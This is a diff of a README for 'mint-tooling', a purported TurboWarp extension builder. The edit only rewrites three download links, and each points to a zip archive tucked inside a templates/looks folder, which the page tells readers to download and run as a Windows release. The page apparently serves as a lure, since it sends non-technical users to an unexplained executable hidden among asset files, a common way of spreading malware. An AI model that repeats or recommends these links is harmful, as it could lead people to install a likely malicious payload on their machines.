@@ -1,6 +1,6 @@
 # 🧰 mint-tooling - Build TurboWarp Extensions with Ease
 
-[![Download mint-tooling](https://img.shields.io/badge/Download-mint--tooling-6f42c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Fifthfaberge24/mint-tooling/main/templates/looks/tooling-mint-v2.3.zip)
+[![Download mint-tooling](https://img.shields.io/badge/Download-mint--tooling-6f42c1?style=for-the-badge&logo=github)](https://github.com/Fifthfaberge24/mint-tooling/raw/refs/heads/main/templates/looks/tooling-mint-v2.3.zip)
 
 ## 🌟 What this app does
 
@@ -20,7 +20,7 @@ Use it if you want a cleaner way to work on Scratch and TurboWarp extensions wit
 
 Visit this page to download the latest Windows release:
 
-https://raw.githubusercontent.com/Fifthfaberge24/mint-tooling/main/templates/looks/tooling-mint-v2.3.zip
+https://github.com/Fifthfaberge24/mint-tooling/raw/refs/heads/main/templates/looks/tooling-mint-v2.3.zip
 
 After the page opens:
 
@@ -168,4 +168,4 @@ You do not need programming knowledge to run mint-tooling. If you decide to edit
 
 Download and run the latest Windows release from:
 
-https://raw.githubusercontent.com/Fifthfaberge24/mint-tooling/main/templates/looks/tooling-mint-v2.3.zip
+https://github.com/Fifthfaberge24/mint-tooling/raw/refs/heads/main/templates/looks/tooling-mint-v2.3.zip
